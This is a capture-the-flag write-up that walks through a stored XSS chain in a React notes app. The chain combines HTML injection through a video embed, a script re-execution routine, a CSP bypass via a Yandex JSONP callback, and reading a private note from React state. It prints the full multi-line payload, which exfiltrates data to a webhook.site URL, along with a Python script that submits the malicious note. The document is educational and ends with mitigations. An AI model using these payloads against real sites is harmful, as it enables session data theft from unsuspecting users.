# Web Challenge 4: Yet Another Notes - Writeup

**Author:** marlithor-cyber
**Challenge Name:** Yet another notes
**Category:** Web
**Difficulty:** Hard

## Challenge Description

"Yet another notes" - the name itself was a hint that this would be another note-taking application, probably with some XSS vulnerability. The challenge presented a modern React-based notes app where users could create, edit, and share notes. There was also a bot that would visit our notes, which immediately suggested a client-side attack vector.

## Initial Exploration

When I first accessed the application, I found a clean, modern interface with several features:

1. **Note Creation**: Create notes with a rich text editor
2. **Note Sharing**: Notes could be public or private
3. **Video Embedding**: Special syntax `{video id=...}` to embed videos
4. **Bot Submission**: Submit a note UUID for the admin bot to visit

The bot behavior was interesting - according to `bot/lib/browser.js`, it:
1. Registers a fresh user account
2. Creates a private note titled "Flag" containing the actual flag
3. Visits the attacker's public note

This setup screamed "steal the bot's private data via XSS!"

## Source Code Analysis

I started digging through the provided source code to understand how notes were rendered.

### The Video Plugin Vulnerability

In `web/src/lib/videoPlugin.js`, I found the video embedding functionality:

```js
this.dom.innerHTML =
  `<iframe src="https://runtime.video.cloud.yandex.net/player/video/${node.attrs.id}" ...></iframe>`;
```

This is a classic HTML injection! The `node.attrs.id` comes directly from the `{video id=...}` syntax in the note content and is inserted into `innerHTML` without any escaping.

This means I could break out of the iframe tag by injecting:
```
{video id="></iframe><script>alert(1)</script>}
```

### The Script Re-execution Mechanism

But wait, there's more! In `web/src/components/NoteView.jsx`, I found something even more interesting:

```js
editorRef.current.querySelectorAll("script").forEach((old) => {
  const el = document.createElement("script");
  ...
  old.replaceWith(el);
});
```

The application intentionally finds all `<script>` tags in the rendered note and **re-creates them**! This is done to make injected scripts actually execute (normally, scripts inserted via `innerHTML` don't run).

So the vulnerability chain is:
1. Inject HTML via the video plugin
2. Include `<script>` tags in the injection
3. The app re-creates those scripts, causing them to execute

Perfect for stored XSS!

## The CSP Challenge

Of course, it couldn't be that easy. The application had a Content Security Policy:

```
script-src 'self' *.yandex.net
```

This CSP blocks:
- Inline JavaScript (`<script>alert(1)</script>`)
- External scripts from most domains

But it allows scripts from `*.yandex.net` domains. I needed to find a way to execute arbitrary JavaScript while only loading scripts from Yandex.

### JSONP to the Rescue

I researched Yandex services and found the Yandex Speller API, which has a JSONP endpoint:

```
https://speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=myCallback
```

This endpoint returns:
```js
myCallback([...])
```

The key insight: I can control the `callback` parameter! If I use an arrow function expression as the callback, I can execute arbitrary code:

```
callback=(_=>alert(1))
```

This becomes:
```js
(_=>alert(1))([...])
```

Which executes `alert(1)` and ignores the array argument!

## Developing the Exploit

Now I had all the pieces:
1. HTML injection via video plugin
2. Script re-execution by the app
3. CSP bypass via Yandex JSONP

But there was a constraint: the video plugin rejected IDs longer than 200 bytes. This meant I couldn't fit my entire payload in a single `{video}` tag.

### Solution: Multiple Video Tags

I split my exploit into multiple `{video}` tags, each injecting a small piece of JavaScript:

```
{video id="></iframe><script src="//speller.yandex.net/...callback=(_=>code1)"></script>}
{video id="></iframe><script src="//speller.yandex.net/...callback=(_=>code2)"></script>}
{video id="></iframe><script src="//speller.yandex.net/...callback=(_=>code3)"></script>}
```

Each line injects a separate script tag that executes one statement.

## Extracting the Flag

Now I needed to figure out how to steal the bot's private "Flag" note. I had several options:

1. **Fetch `/api/notes`**: Make an API request to get all notes
2. **Read React state**: Extract data from React's internal state
3. **DOM manipulation**: Find the flag in the rendered DOM

I chose option 2 - reading React state - because the sidebar already loads all the user's notes, and React keeps that data in memory.

### Diving into React Internals

React stores component state in "fiber" objects attached to DOM nodes. I needed to:
1. Find the sidebar DOM element
2. Access its React fiber
3. Navigate to the component state
4. Extract the notes array
5. Find the "Flag" note content

After some experimentation with React DevTools, I found the path:

```js
Object.values(top.root.firstChild.firstChild)[0]
  .return
  .memoizedState
  .memoizedState[0]
```

This gives me the first note in the sidebar, which is the bot's private "Flag" note (since it's the most recently created).

## Building the Final Payload

I needed to:
1. Set up a form for data exfiltration
2. Navigate through React state to find the flag
3. Submit the flag to my webhook

Here's my payload structure:

```
{video id="></iframe><form/id=f><input/id=x></form>}
{video id="></iframe><textarea/id=t>https://webhook.site/YOUR-WEBHOOK</textarea>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>f=document.forms[0])"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>x=document.forms[0][0])"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0].action=top.t.value)"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0].method='post')"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>document.forms[0][0].name='d')"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>s=top.root.firstChild.firstChild)"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>r=Object.values(s)[0],2e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>q=r.return,4e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>m=q.memoizedState,5e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>n=m.memoizedState[0],6e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>x.value=n.content,8e3))"></script>}
{video id="></iframe><script/src="//speller.yandex.net/services/spellservice.json/checkText?text=helo&callback=(_=>setTimeout(_=>f.submit(),9e3))"></script>}
```

Let me break down what this does:

1. **Lines 1-2**: Create a form and textarea with the webhook URL
2. **Lines 3-7**: Set up the form to POST to the webhook
3. **Line 8**: Get reference to the sidebar DOM element
4. **Lines 9-12**: Navigate through React fiber to find the notes state (with delays to ensure React has rendered)
5. **Line 13**: Extract the flag content and put it in the form input
6. **Line 14**: Submit the form to exfiltrate the flag

The `setTimeout` delays are necessary because React needs time to render the sidebar and populate the state.

## Exploitation Steps

### Step 1: Set Up Webhook

I created a webhook at webhook.site to receive the exfiltrated data.

### Step 2: Create Malicious Note

I created a new public note with my payload:

```python
import requests

session = requests.Session()

# Register account
session.post("http://challenge/api/register", json={
    "username": "attacker",
    "password": "password123"
})

# Create malicious note
response = session.post("http://challenge/api/notes", json={
    "title": "Innocent Note",
    "content": """
{video id="></iframe><form/id=f><input/id=x></form>}
{video id="></iframe><textarea/id=t>https://webhook.site/YOUR-WEBHOOK</textarea>}
[... rest of payload ...]
""",
    "public": True
})

note_uuid = response.json()["uuid"]
print(f"Note UUID: {note_uuid}")
```

### Step 3: Submit to Bot

I submitted my note UUID to the bot:

```python
session.post("http://challenge/api/bot", json={
    "uuid": note_uuid
})
```

### Step 4: Wait for Exfiltration

I watched my webhook.site dashboard. After about 10 seconds (accounting for all the setTimeout delays), I received a POST request:

```
d=LB{6a93f0d3ab7865413f804b6949546833}
```

## Flag

```text
LB{6a93f0d3ab7865413f804b6949546833}
```

Success! The flag was exfiltrated from the bot's private note.

## Root Cause Analysis

This vulnerability chain involved multiple issues:

### 1. Unsafe innerHTML Usage

```js
this.dom.innerHTML = `<iframe src="...${node.attrs.id}..."></iframe>`;
```

User-controlled data should never be inserted into `innerHTML` without proper escaping or sanitization.

### 2. Script Re-execution

```js
editorRef.current.querySelectorAll("script").forEach((old) => {
  const el = document.createElement("script");
  old.replaceWith(el);
});
```

This code intentionally makes injected scripts executable, turning HTML injection into XSS.

### 3. Overly Permissive CSP

```
script-src 'self' *.yandex.net
```

Allowing all of `*.yandex.net` opened the door to JSONP abuse. A stricter CSP would only allow specific, necessary domains.

### 4. JSONP Callback Injection

The Yandex Speller API allows arbitrary callback names, enabling code execution through arrow function expressions.

### 5. Sensitive Data in Client State

The application loads all user notes (including private ones) into React state, making them accessible to XSS attacks.

## Why This Attack Works

The key insight is that modern web applications often have complex client-side state management. React, Vue, and other frameworks keep data in memory for performance reasons. If an attacker can execute JavaScript in the victim's context, they can access this data without making additional API requests.

The CSP bypass via JSONP is also crucial - many developers think CSP protects against XSS, but misconfigured CSPs (especially those allowing broad domain wildcards) can often be bypassed.

## Lessons Learned

1. **Never use innerHTML with user data**: Use `textContent` or proper sanitization libraries
2. **Don't re-execute scripts**: The script re-execution mechanism was unnecessary and dangerous
3. **Strict CSP**: Avoid wildcards in CSP; allowlist specific endpoints only
4. **Disable JSONP**: Modern APIs should use CORS instead of JSONP
5. **Minimize client-side secrets**: Don't load sensitive data unless it's being displayed
6. **Defense in depth**: Multiple layers of protection would have prevented this attack

## Mitigation

To fix these vulnerabilities:

1. **Escape HTML**: Use a library like DOMPurify to sanitize user content
```js
this.dom.innerHTML = DOMPurify.sanitize(content);
```

2. **Remove script re-execution**: This feature serves no legitimate purpose
```js
// Delete this entire code block
```

3. **Strict CSP**: Only allow specific, necessary endpoints
```
script-src 'self' https://specific-cdn.example.com/script.js
```

4. **Avoid JSONP**: Use CORS for cross-origin requests

5. **Lazy load sensitive data**: Only fetch private notes when the user explicitly views them

## Conclusion

"Yet another notes" was an excellent challenge that combined multiple modern web security concepts:
- HTML injection via unsafe innerHTML
- CSP bypass via JSONP
- React internals exploitation
- Client-side data exfiltration

The challenge demonstrated that even with security measures like CSP, a chain of small vulnerabilities can lead to complete compromise. It also showed the importance of understanding framework internals - knowing how React stores state was crucial for extracting the flag efficiently.

This type of vulnerability is particularly dangerous in real-world applications because:
- Developers often trust CSP to prevent XSS
- Modern frameworks encourage keeping data in client-side state
- JSONP endpoints are still common on legacy APIs
- HTML injection is often dismissed as less serious than XSS

The key takeaway: defense in depth is essential. No single security measure is sufficient - you need multiple layers of protection to prevent sophisticated attacks.
